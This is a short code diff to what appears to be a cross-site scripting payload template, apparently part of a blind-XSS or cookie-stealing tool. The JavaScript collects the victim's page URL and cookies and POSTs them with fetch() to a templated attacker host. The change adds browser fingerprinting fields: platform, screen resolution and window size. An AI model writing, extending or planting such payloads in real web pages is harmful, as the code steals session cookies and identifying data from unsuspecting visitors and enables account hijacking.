@@ -4,7 +4,10 @@ u = "http://{{IP}}:{{PORT}}{{INFO_ENDPOINT}}/{{UID}}";
 //console.log(document.cookie);
 j = {url: window.location.href,
     cookie: document.cookie,
-    user_agent: window.navigator.userAgent
+    user_agent: window.navigator.userAgent,
+    platform: window.navigator.platform,
+    screen_resolution: window.screen.width + "x" + window.screen.height,
+    browser_size: window.innerWidth + "x" + window.innerHeight
 };
 fetch(u, {
     method: "POST",
